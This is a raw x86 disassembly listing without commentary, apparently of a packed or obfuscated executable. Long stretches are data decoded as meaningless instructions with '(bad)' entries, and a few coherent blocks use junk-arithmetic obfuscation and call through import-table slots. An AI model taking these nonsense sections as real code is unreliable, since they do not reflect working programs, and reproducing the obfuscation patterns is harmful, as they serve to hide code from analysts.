  417c52:	and    bl,BYTE PTR [ecx-0x56]
  417c55:	pop    esi
  417c56:	dec    ecx
  417c57:	jae    0x417cc5
  417c59:	pop    ss
  417c5a:	aad    0x7b
  417c5c:	outs   dx,DWORD PTR ds:[esi]
  417c5d:	sub    al,0xe7
  417c5f:	loopne 0x417c98
  417c61:	xchg   DWORD PTR [eax+0x58],ecx
  417c64:	push   ds
  417c65:	sub    DWORD PTR [eax+0x7d60f0e2],ebx
  417c6b:	es jl  0x417cb2
  417c6e:	jmp    0x3e34bec2
  417c73:	mov    BYTE PTR [ebx-0x9],al
  417c76:	dec    ebx
  417c77:	out    0xb7,eax
  417c79:	dec    edi
  417c7a:	cmp    eax,0x57c3cf2d
  417c7f:	pusha  
  417c80:	mov    al,ds:0x27d9b23
  417c85:	imul   edx,edx,0x53
  417c88:	and    dl,al
  417c8a:	fldenv [edi+0x13f515cc]
  417c90:	mov    WORD PTR [ebp+0x5b],cs
  417c93:	pop    edx
  417c94:	jns    0x417ca6
  417c96:	sbb    BYTE PTR [edx-0x70],al
  417c99:	pop    edx
  417c9a:	jb     0x417d15
  417c9c:	imul   DWORD PTR [edx+0x6c65fbd3]
  417ca2:	inc    ebp
  417ca3:	repz jne 0x417ca5
  417ca6:	mov    esp,0x28cc7a73
  417cab:	dec    edx
  417cac:	js     0x417c4c
  417cae:	ins    BYTE PTR es:[edi],dx
  417caf:	adc    esp,edx
  417cb1:	adc    BYTE PTR [esi-0x6c47a4d4],al
  417cb7:	cdq    
  417cb8:	add    dl,bh
  417cba:	sbb    al,0xd2
  417cbc:	daa    
  417cbd:	(bad)  
  417cbe:	das    
  417cbf:	push   eax
  417cc0:	(bad)  
  417cc1:	call   0xffd8:0x59f10234
  417cc8:	jmp    DWORD PTR [ebx+0x38d5de62]
  417cce:	push   ebx
  417ccf:	inc    eax
  417cd0:	sub    ch,ch
  417cd2:	pop    eax
  417cd3:	in     eax,0xd4
  417cd5:	xchg   edi,eax
  417cd6:	sbb    al,BYTE PTR [ebp+0x23]
  417cd9:	cmp    BYTE PTR ds:0x45acfd85,dh
  417cdf:	mov    dl,0x33
  417ce1:	inc    DWORD PTR [ecx]
  417ce3:	in     eax,dx
  417ce4:	mov    ah,dl
  417ce6:	dec    ebx
  417ce7:	lods   al,BYTE PTR ds:[esi]
  417ce8:	xor    eax,0xc4b12df9
  417ced:	jns    0x417c97
  417cef:	adc    BYTE PTR [esi+0x51d6f695],ah
  417cf5:	adc    al,0x56
  417cf7:	in     al,dx
  417cf8:	(bad)  
  417cf9:	fsub   st,st(5)
  417cfb:	xlat   BYTE PTR ds:[ebx]
  417cfc:	pop    eax
  417cfd:	xchg   BYTE PTR [edx-0x373c4ef3],ah
  417d03:	les    eax,FWORD PTR [edi]
  417d05:	push   0x49a6b0eb
  417d0a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d0c:	jp     0x417d84
  417d0e:	mov    ch,0x4b
  417d10:	imul   esi,DWORD PTR [esi+esi*8+0x55],0xffffff9e
  417d15:	pop    ebp
  417d16:	aaa    
  417d17:	xor    eax,0x42fa9437
  417d1c:	add    al,0x14
  417d1e:	sub    ch,BYTE PTR [ebp-0x7ed7eb11]
  417d24:	and    al,0x6a
  417d26:	inc    edx
  417d27:	push   ds
  417d28:	cwde   
  417d29:	into   
  417d2a:	xlat   BYTE PTR ds:[ebx]
  417d2b:	mov    bh,0x7b
  417d2d:	scas   al,BYTE PTR es:[edi]
  417d2e:	cmp    al,0x86
  417d30:	test   BYTE PTR fs:[esi+0xb004077],bl
  417d37:	aas    
  417d38:	shl    DWORD PTR [ecx+0x3],cl
  417d3b:	mov    al,0x41
  417d3d:	dec    ebp
  417d3e:	mov    eax,0x8090109
  417d43:	(bad)  
  417d44:	(bad)  
  417d45:	jns    0x417d21
  417d47:	mov    eax,ecx
  417d49:	sub    al,0x38
  417d4b:	rcl    dl,0x4e
  417d4e:	ins    DWORD PTR es:[edi],dx
  417d4f:	mov    bl,BYTE PTR [ebx]
  417d51:	pop    esi
  417d52:	xor    eax,0xc44d6be7
  417d57:	(bad)  
  417d58:	and    al,0xb3
  417d5a:	adc    eax,0xf9ae3da9
  417d5f:	jae    0x417d86
  417d61:	loope  0x417dd5
  417d63:	xlat   BYTE PTR ds:[ebx]
  417d64:	es shl ecx,cl
  417d67:	fisttp WORD PTR [esi-0x4d]
  417d6a:	jmp    0x6f3e:0x918a7539
  417d71:	or     eax,0x865b7bb9
  417d76:	mov    bh,0x94
  417d78:	fs out dx,eax
  417d7a:	mov    edi,0x1385dfcc
  417d7f:	sbb    BYTE PTR [esi-0x36],dh
  417d82:	int3   
  417d83:	call   DWORD PTR [edx-0x30]
  417d86:	in     al,0x65
  417d88:	mov    ah,0x2c
  417d8a:	pop    edi
  417d8b:	in     eax,dx
  417d8c:	daa    
  417d8d:	(bad)  [edi+0x182f11f]
  417d93:	sbb    edx,DWORD PTR [eax+0x370e00ab]
  417d99:	jle    0x417dc6
  417d9b:	into   
  417d9c:	retf   
  417d9d:	les    ebx,FWORD PTR [eax-0x26]
  417da0:	call   0xca9b:0xc193fabe
  417da7:	loop   0x417d65
  417da9:	dec    esp
  417daa:	jno    0x417d76
  417dac:	das    
  417dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dae:	(bad)  
  417daf:	jp     0x417d5e
  417db1:	mov    ebx,0x92a7f812
  417db6:	mov    esi,0x1a078f68
  417dbb:	and    eax,ecx
  417dbd:	xor    ebx,DWORD PTR [ebp-0x16]
  417dc0:	jmp    0x5928:0x5a786374
  417dc7:	cwde   
  417dc8:	push   esi
  417dc9:	(bad)  
  417dca:	clc    
  417dcb:	xchg   BYTE PTR [ecx+0x1c1412dd],bl
  417dd1:	jno    0x417e2d
  417dd3:	xchg   ebp,eax
  417dd4:	fild   DWORD PTR [edi-0x355c3108]
  417dda:	in     al,0x3
  417ddc:	mov    al,ds:0xced0de6e
  417de1:	addr16 nop
  417de3:	mov    bl,0x36
  417de5:	mov    bh,0x79
  417de7:	ja     0x417dd3
  417de9:	in     al,0x45
  417deb:	mov    gs,WORD PTR [eax+0x45]
  417dee:	(bad)
  417df2:	pushf  
  417df3:	inc    ecx
  417df4:	xor    BYTE PTR [edi],0x13
  417df7:	scas   eax,DWORD PTR es:[edi]
  417df8:	nop
  417df9:	dec    edi
  417dfa:	cmp    al,BYTE PTR [edi-0xc4ec78b]
  417e00:	push   eax
  417e01:	mov    al,0x70
  417e03:	dec    ecx
  417e04:	dec    ebx
  417e05:	call   0x2f18:0x5cc9b14a
  417e0c:	ins    DWORD PTR es:[edi],dx
  417e0d:	jno    0x417e86
  417e0f:	jb     0x417d9f
  417e11:	jl     0x417e66
  417e13:	jo     0x417e2a
  417e15:	mov    ecx,0xc9caea89
  417e1a:	fisub  WORD PTR [esi+0x93dbbe3]
  417e20:	xchg   esp,eax
  417e21:	dec    ecx
  417e22:	(bad)  [edx]
  417e24:	mov    ch,0xed
  417e26:	in     al,0x3
  417e28:	xchg   edx,eax
  417e29:	repz int3 
  417e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2d:	dec    esi
  417e2e:	mov    esp,0x5cd4689
  417e33:	je     0x417df4
  417e35:	xor    al,0xfc
  417e37:	jle    0x417dfd
  417e39:	mov    bl,0xa3
  417e3b:	adc    esi,esp
  417e3d:	(bad)  
  417e3e:	rcl    eax,1
  417e40:	push   es
  417e41:	ja     0x417e1f
  417e43:	push   eax
  417e44:	leave  
  417e45:	xor    eax,0x2a56596c
  417e4a:	jne    0x417e20
  417e4c:	pushf  
  417e4d:	and    eax,0x6e61c5a9
  417e52:	xchg   ebx,eax
  417e53:	dec    esp
  417e54:	test   al,0x2b
  417e56:	add    ebp,DWORD PTR [edx+0x49b90c31]
  417e5c:	cmp    dh,BYTE PTR [esi]
  417e5e:	in     al,0xb1
  417e60:	(bad)  
  417e61:	mov    edi,edx
  417e63:	add    BYTE PTR [edx+0x59f6a1a7],bl
  417e69:	dec    edx
  417e6a:	test   al,0xaf
  417e6c:	jl     0x417e61
  417e6e:	bound  ecx,QWORD PTR [esi+0x41]
  417e71:	mov    ebp,0x7b02027e
  417e76:	sti    
  417e77:	and    eax,0xd1c31a39
  417e7c:	mov    esp,0x68d78d16
  417e81:	aas    
  417e82:	lds    edi,FWORD PTR [ebx+0x4fde7519]
  417e88:	pop    esi
  417e89:	fild   DWORD PTR [edx+ecx*2]
  417e8c:	cli    
  417e8d:	pop    esi
  417e8e:	jbe    0x417ede
  417e90:	pop    edi
  417e91:	mov    esi,0xdbf2c5ba
  417e96:	(bad)  
  417e97:	icebp  
  417e98:	out    dx,al
  417e99:	push   esp
  417e9a:	sbb    al,0x9d
  417e9c:	add    BYTE PTR [eax+0x1bf90a5],cl
  417ea2:	(bad)  
  417ea3:	inc    DWORD PTR [edi+0x333f3c3c]
  417ea9:	mov    esi,0x4dd0f514
  417eae:	mov    esi,0xc761dca5
  417eb3:	inc    esp
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x42832f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x4281f3,0x42824b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428343,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42823f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42833b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428343,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e48
  417f43:	sub    DWORD PTR ds:0x428217,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x4281fb
  417f53:	mov    ecx,DWORD PTR ds:0x42825b
  417f59:	and    DWORD PTR ds:0x428157,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428333
  417f65:	mov    ecx,DWORD PTR ds:0x428147
  417f6b:	or     DWORD PTR ds:0x4282db,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42835f
  417f77:	or     DWORD PTR ds:0x428247,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x4c
  417f8f:	cli    
  417f90:	repnz push 0x53
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1-0x2950e7e8],bh
  417f9c:	test   DWORD PTR [eax],ebp
  417f9e:	das    
  417f9f:	jmp    0x417fbe
  417fa1:	sbb    ch,BYTE PTR [edi-0x44e00203]
  417fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa8:	call   0xfda87dd7
  417fad:	push   ecx
  417fae:	leave  
  417faf:	in     eax,0xa4
  417fb1:	ror    ch,0xf6
  417fb4:	fistp  WORD PTR [eax]
  417fb6:	xor    edi,DWORD PTR [edi+0x56]
  417fb9:	das    
  417fba:	pusha  
  417fbb:	aam    0xd
  417fbd:	sahf   
  417fbe:	(bad)
  417fc1:	mov    ecx,0x839508c0
  417fc6:	cmp    dl,BYTE PTR [ecx]
  417fc8:	cmp    al,0xfc
  417fca:	inc    eax
  417fcb:	rcr    BYTE PTR [esi-0x22fe0a15],cl
  417fd1:	imul   esp,ebp,0xed2da74
  417fd7:	mov    ch,BYTE PTR [ebp-0x5a]
  417fda:	rcl    BYTE PTR [ebp+0x3e7212af],1
  417fe0:	mov    ah,0x2e
  417fe2:	outs   dx,DWORD PTR ds:[esi]
  417fe4:	push   cs
  417fe5:	cmp    al,0xf1
  417fe7:	mov    ebp,0x89aac250
  417fec:	cld    
  417fed:	js     0x418011
  417fef:	push   esi
  417ff0:	mov    cl,0x2f
  417ff2:	cmp    dh,BYTE PTR [edi+eax*1]
  417ff5:	test   eax,0xf3067138
  417ffa:	sub    ah,cl
  417ffc:	cmc    
  417ffd:	pop    eax
  417ffe:	sbb    eax,0x6e94b436
  418003:	test   BYTE PTR [ecx],0x38
  418006:	popf   
  418007:	shl    DWORD PTR [esi],cl
  418009:	dec    eax
  41800a:	icebp  
  41800b:	cmp    eax,0x83eba5f5
  418010:	jmp    0x474d:0x19874979
  418017:	cmp    ch,BYTE PTR [ebx+ecx*2-0x29]
  41801b:	add    DWORD PTR [eax-0x2b6c9a38],0xffffffce
  418022:	cmp    dl,bh
  418024:	add    ebp,DWORD PTR [esi]
  418026:	sub    DWORD PTR [edx+0x61],esi
  418029:	mov    esi,0x19d4d4d9
  41802e:	pop    ebx
  41802f:	pop    edi
  418030:	push   cs
  418031:	xchg   ebx,eax
  418032:	pop    es
  418033:	inc    edx
  418034:	aad    0x84
  418036:	jle    0x418003
  418038:	gs dec ebx
  41803a:	cmp    eax,0xc271ec7a
  41803f:	retf   
  418040:	or     edi,DWORD PTR [eax+0x71]
  418043:	outs   dx,DWORD PTR ds:[esi]
  418044:	dec    esi
  418045:	ja     0x417ff4
  418047:	fs pop ss
  418049:	inc    ecx
  41804a:	pop    ecx
  41804b:	or     ecx,ebx
  41804d:	in     eax,0xa3
  41804f:	or     DWORD PTR [edi+0x713421ec],0x9c40ca57
  418059:	pushf  
  41805a:	jae    0x418034
  41805c:	adc    DWORD PTR [edi+eax*1],ebp
  41805f:	shl    BYTE PTR [edx-0x5a62cff],1
  418065:	mov    dl,0xaa
  418067:	adc    cl,BYTE PTR [ecx+0x21225a90]
  41806d:	shl    DWORD PTR [ecx+ebx*1+0x48],1
  418071:	das    
  418072:	sub    DWORD PTR [ebx+edi*1+0x4fbae092],esp
  418079:	test   DWORD PTR [ebx-0x2c],ebp
  41807c:	call   0x6d40:0xda8c31a2
  418083:	xchg   ebp,eax
  418084:	adc    BYTE PTR [ebx],bl
  418086:	stc    
  418087:	mov    ebp,0xd9b7f9fa
  41808c:	es ja  0x418036
  41808f:	scas   eax,DWORD PTR es:[edi]
  418090:	fistp  WORD PTR [esi+0x67]
  418093:	mov    ebx,0x90d5248c
  418098:	bound  esi,QWORD PTR [eax+0x29dcfc8f]
  41809e:	dec    ebp
  41809f:	jb     0x41809e
  4180a1:	ja     0x41806d
  4180a3:	outs   dx,DWORD PTR ds:[esi]
  4180a4:	push   ebx
  4180a5:	mov    ebp,0x5224dbcc
  4180aa:	or     eax,DWORD PTR [ecx]
  4180ac:	js     0x418080
  4180ae:	pushf  
  4180af:	test   BYTE PTR [ecx+0x28520f43],0xa4
  4180b6:	and    al,0xc2
  4180b8:	cmc    
  4180b9:	cld    
  4180ba:	lds    ecx,FWORD PTR [edx+0x7e]
  4180bd:	lahf   
  4180be:	mov    dl,0xe5
  4180c0:	add    esp,DWORD PTR [ecx+edi*4+0x77caf1af]
  4180c7:	enter  0xc996,0x4c
  4180cb:	pusha  
  4180cc:	stos   BYTE PTR es:[edi],al
  4180cd:	rcr    DWORD PTR [edx-0x21ca308b],cl
  4180d3:	inc    ecx
  4180d4:	push   esi
  4180d5:	xor    ah,BYTE PTR [ebp+0x78]
  4180d8:	in     al,dx
  4180d9:	popf   
  4180da:	test   DWORD PTR [edi+0x36],0x87b6afe0
  4180e1:	xor    BYTE PTR [edx+0x28],0x46
  4180e5:	dec    ebp
  4180e6:	xchg   esi,eax
  4180e7:	mov    ah,0x48
  4180e9:	sub    al,0x9
  4180eb:	shl    DWORD PTR [edx+0x7b],0x19
  4180ef:	daa    
  4180f0:	inc    esp
  4180f1:	mov    DWORD PTR [esi+esi*8-0x59],edi
  4180f5:	lahf   
  4180f6:	arpl   cx,sp
  4180f8:	stos   DWORD PTR es:[edi],eax
  4180f9:	inc    esp
  4180fa:	cmp    esi,edi
  4180fc:	mov    al,ds:0xf4eb4c3f
  418101:	(bad)  
  418102:	push   ebx
  418103:	test   ecx,edi
  418105:	push   0x3d
  418107:	xor    ebx,ebp
  418109:	jno    0x418184
  41810b:	in     eax,0x84
  41810d:	sbb    al,0xa0
  41810f:	jo     0x4180f8
  418111:	sti    
  418112:	adc    esp,ebp
  418114:	adc    DWORD PTR [ebx+ebx*1+0x70],ebp
  418118:	ror    DWORD PTR [esi],0x89
  41811b:	inc    edi
  41811c:	cli    
  41811d:	or     BYTE PTR [esi+0x79],0xe
  418121:	xor    ah,BYTE PTR [eax+edi*1-0xcc90848]
  418128:	lock mov ds:0x2a24a6b6,al
  41812e:	aas    
  41812f:	loopne 0x418194
  418131:	add    dh,ch
  418133:	cwde   
  418134:	xor    al,0x68
  418136:	shl    BYTE PTR [ecx-0x12],1
  418139:	cld    
  41813a:	push   0x17e082b7
  41813f:	add    eax,0xe94d3ced
  418144:	mov    cs,WORD PTR [esi+0x2a]
  418147:	es leave 
  418149:	and    al,0x12
  41814b:	push   ds
  41814c:	mov    esp,0x600f494d
  418151:	pop    edx
  418152:	cli    
  418153:	dec    eax
  418154:	(bad)  
  418155:	out    dx,eax
  418156:	mov    ebx,0x61db97ed
  41815b:	dec    ecx
  41815c:	mov    cl,0x80
  41815e:	call   0x4b12:0xa3854b70
  418165:	pusha  
  418166:	cmp    BYTE PTR [esi+0x11],dh
  418169:	cmp    eax,0xe4e32de1
  41816e:	ja     0x4181ab
  418170:	jmp    0x6f496817
  418175:	dec    ebx
  418176:	mov    cl,0xd
  418178:	cmc    
  418179:	xchg   ecx,eax
  41817a:	ret    
  41817b:	aaa    
  41817c:	mov    esp,0x8ab85f12
  418181:	in     al,0xc9
  418183:	popa   
  418184:	inc    eax
  418185:	jg     0x418161
  418187:	out    0xbc,al
  418189:	add    DWORD PTR [edi-0x4fdec65f],esp
  41818f:	jo     0x4181cb
  418191:	ret    0xe21f
  418194:	aam    0x55
  418196:	not    DWORD PTR [eax+0x4ee88d4e]
  41819c:	mov    dl,0x7c
  41819e:	cmp    DWORD PTR [edi-0x207c09b4],esi
  4181a4:	jge    0x4181df
  4181a6:	xchg   BYTE PTR [eax-0x2b87322e],bh
  4181ac:	jle    0x41813a
  4181ae:	adc    al,0xbd
  4181b0:	int3   
  4181b1:	jbe    0x4181b9
  4181b3:	dec    ecx
  4181b4:	dec    edx
  4181b5:	ja     0x41820d
  4181b7:	cs and eax,0xc558f4ba
  4181bd:	int    0xe8
  4181bf:	icebp  
  4181c0:	mov    WORD PTR [ebx],?
  4181c2:	loop   0x4181ec
  4181c4:	scas   al,BYTE PTR es:[edi]
  4181c5:	and    eax,0x5d83696e
  4181ca:	mov    bh,0xe0
  4181cc:	mov    ch,0x13
  4181ce:	mov    bl,0x2a
  4181d0:	ja     0x418182
  4181d2:	bswap  edx
  4181d4:	mov    ch,0x8a
  4181d6:	shr    ebx,cl
  4181d8:	mov    eax,ds:0x76eebb64
  4181dd:	jns    0x418205
  4181df:	or     esp,ebx
  4181e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e2:	or     al,0xc
  4181e4:	into   
  4181e5:	push   ds
  4181e6:	rol    BYTE PTR [edi-0x7e],1
  4181e9:	inc    edi
  4181ea:	lods   eax,DWORD PTR ds:[esi]
  4181eb:	clc    
  4181ec:	xchg   ebx,eax
  4181ed:	jne    0x4181b3
  4181ef:	out    0x16,eax
  4181f1:	(bad)  
  4181f2:	nop
  4181f3:	push   0xdccfc5fb
  4181f8:	mov    edx,0xd490f5bf
  4181fd:	xchg   BYTE PTR [esi],al
  4181ff:	fstp   DWORD PTR es:[eax-0x77]
  418203:	ins    DWORD PTR es:[edi],dx
  418204:	push   ebp
  418205:	mov    eax,0x8f471f2d
  41820a:	xor    eax,0x5930d625
  41820f:	mov    esi,0x38f17c15
  418214:	test   DWORD PTR ds:0x78b7b83,edx
  41821a:	outs   dx,DWORD PTR ds:[esi]
  41821b:	cmp    bh,BYTE PTR [eax+0x3d]
  41821e:	jp     0x418205
  418220:	pop    eax
  418221:	inc    eax
  418222:	repz jecxz 0x41823c
  418225:	mov    dh,0xfa
  418227:	pop    eax
  418228:	aad    0xd0
  41822a:	add    ecx,DWORD PTR [edx]
  41822c:	mov    esi,0x45413323
  418231:	add    eax,0x2ee55ebf
  418236:	std    
  418237:	pop    es
  418238:	jmp    0xb661:0x818a894e
  41823f:	clc    
  418240:	icebp  
  418241:	int3   
  418242:	test   al,0xf1
  418244:	popf   
  418245:	inc    edi
  418246:	push   esi
  418247:	lock xchg esp,eax
  418249:	fistp  WORD PTR [edx+0x6d]
  41824c:	inc    ebx
  41824d:	inc    eax
  41824e:	add    cl,BYTE PTR [ebx]
  418250:	inc    esp
  418251:	sahf   
  418252:	fiadd  DWORD PTR [ecx+0x6b]
  418255:	mov    edi,DWORD PTR [ebp-0x14587077]
  41825b:	fs aam 0xdc
  41825e:	adc    BYTE PTR [ebx+0x67588f22],ch
  418264:	mov    ah,BYTE PTR [edx-0x2c95831]
  41826a:	test   BYTE PTR [edx+ebx*2+0x69],bh
  41826e:	push   ebp
  41826f:	ss jecxz 0x4182af
  418272:	inc    ebp
  418273:	jno    0x4182c5
  418275:	add    ebp,DWORD PTR [ebx]
  418277:	rcr    DWORD PTR [eax+0x7d],cl
  41827a:	clc    
  41827b:	mov    es,WORD PTR [esi-0x37eca1f5]
  418281:	sar    BYTE PTR [ebx-0x6cc8b8e4],0xd2
  418288:	sub    eax,0x936dccf8
  41828d:	mov    WORD PTR [ebx+0x1c],gs
  418290:	ins    DWORD PTR es:[edi],dx
  418291:	push   edi
  418292:	fisubr DWORD PTR [eax]
  418294:	add    eax,0xb078557c
  418299:	ret    0x2eb0
  41829c:	dec    al
  41829e:	pop    ds
  41829f:	stc    
  4182a0:	lds    esp,FWORD PTR [esp+edx*4+0x4fe28d17]
  4182a7:	push   0x45d102ec
  4182ac:	inc    edx
  4182ad:	lods   al,BYTE PTR ds:[esi]
  4182ae:	call   0x2dc0:0x331b46e1
  4182b5:	les    ecx,FWORD PTR [eax-0x7d]
  4182b8:	fisttp DWORD PTR [edx]
  4182ba:	jno    0x41830c
  4182bc:	mov    ds:0xb40690a,eax
  4182c1:	dec    edx
  4182c2:	hlt    
  4182c3:	test   DWORD PTR [ecx+0x6048efa2],ecx
  4182c9:	sahf   
  4182ca:	das    
  4182cb:	das    
  4182cc:	and    al,0x2a
  4182ce:	stos   DWORD PTR es:[edi],eax
  4182cf:	jecxz  0x4182e1
  4182d1:	adc    eax,0xe2e6d236
  4182d6:	xor    al,0x21
  4182d8:	xlat   BYTE PTR ds:[ebx]
  4182d9:	jo     0x41826e
  4182db:	pop    ds
  4182dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182dd:	add    esp,DWORD PTR [esi+0x70]
  4182e0:	cmp    eax,0xb42ed626
  4182e5:	in     eax,dx
  4182e6:	mov    ebx,DWORD PTR [edx-0x768b3ab9]
  4182ec:	sbb    BYTE PTR [ebp-0x39c14fa],0xdc
  4182f3:	stos   BYTE PTR es:[edi],al
  4182f4:	in     eax,dx
  4182f5:	or     DWORD PTR [ecx+0x768804b5],edx
  4182fb:	lods   eax,DWORD PTR ds:[esi]
  4182fc:	xchg   edx,eax
  4182fd:	dec    edi
  4182fe:	imul   edi,DWORD PTR [ebp+0x73],0x5b78cc41
  418305:	les    edi,FWORD PTR [edx]
  418307:	out    0x23,al
  418309:	cmp    esi,DWORD PTR ds:0xc57479a0
  41830f:	fucom  st(5)
  418311:	and    al,0x43
  418313:	les    edx,FWORD PTR [ecx-0x5bd236d8]
  418319:	adc    DWORD PTR [eax+0x21],ebp
  41831c:	cmp    dh,BYTE PTR [ecx]
  41831e:	dec    ecx
  41831f:	jg     0x41830c
  418321:	sbb    DWORD PTR [edi+0x6ade2895],ebx
  418327:	dec    eax
  418328:	cmp    DWORD PTR [edi-0x49],ebp
  41832b:	std    
  41832c:	fs push esp
  41832e:	inc    eax
  41832f:	jo     0x418380
  418331:	add    bh,BYTE PTR [ecx]
  418333:	outs   dx,BYTE PTR ds:[esi]
  418334:	add    al,0x42
  418336:	aaa    
  418337:	out    0xc4,al
  418339:	(bad)  
  41833a:	fcom   QWORD PTR [edi-0x2c0cd841]
  418340:	xor    edi,eax
  418342:	pop    ecx
  418343:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418345:	mov    esp,0xe2c49422
  41834a:	inc    ebp
  41834b:	cld    
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428147,0x0
  418359:	mov    DWORD PTR ds:0x42820b,0x42c6
  418363:	mov    DWORD PTR ds:0x428347,edx
  418369:	mov    DWORD PTR ds:0x428123,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428247,0x243f
  418382:	mov    DWORD PTR ds:0x42821f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428147,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x4282e3
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e4c
  4183ae:	add    DWORD PTR ds:0x4282af,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428233
  4183ba:	xor    DWORD PTR ds:0x4282e7,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282c3
  4183c6:	or     DWORD PTR ds:0x42813f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x4281eb,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x4281ef,0x42815b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42814f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42834f
  418409:	or     DWORD PTR ds:0x428347,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42811f,0x4282e7
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x4281eb,0x0
  418430:	mov    DWORD PTR ds:0x4281fb,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428343,0x5a59
  41844e:	cmp    DWORD PTR ds:0x4281eb,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428043
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428da8
  41846b:	sbb    DWORD PTR ds:0x42822f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428127,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428343
  418485:	xor    ecx,DWORD PTR ds:0x4282ab
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428347,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282bf,0x42822b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428367,0x4281ef
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282bb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	(bad)  
  4184f8:	mov    edi,0xd1f6aae5
  4184fd:	push   ss
  4184fe:	sbb    BYTE PTR [edx+edx*1-0x3617e7e8],bh
  418505:	cmp    eax,0x8d08f729
  41850a:	imul   edi,DWORD PTR [esi],0x9248bc30
  418510:	repz les ebp,FWORD PTR [edx]
  418513:	sub    eax,edi
  418515:	js     0x4184d5
  418517:	(bad)  
  418518:	lock cmp al,0xff
  41851b:	stc    
  41851c:	test   edi,ebp
  41851e:	mov    ah,BYTE PTR [ebx]
  418520:	not    DWORD PTR [edx-0x5e061900]
  418526:	mov    dh,0x7e
  418528:	inc    ebp
  418529:	hlt    
  41852a:	inc    esp
  41852b:	push   ss
  41852c:	xor    ecx,esi
  41852e:	fs fstp TBYTE PTR cs:[ebp+0x7bbb2b9]
  418536:	fidiv  WORD PTR [edx]
  418538:	mov    esi,0x4cdd075b
  41853d:	in     eax,dx
  41853e:	sbb    eax,0x9ab70391
  418543:	mov    ah,0x7f
  418545:	les    edi,FWORD PTR [ebx+0x69830002]
  41854b:	add    ebp,DWORD PTR [eax-0xde8c23]
  418551:	cmp    esp,DWORD PTR [ecx+edx*4-0xc038d82]
  418558:	push   esp
  418559:	lahf   
  41855a:	push   0xfffffff1
  41855c:	mov    es,WORD PTR [edx+0x60c05caf]
  418562:	sbb    cl,al
  418564:	push   esp
  418565:	or     al,0xd8
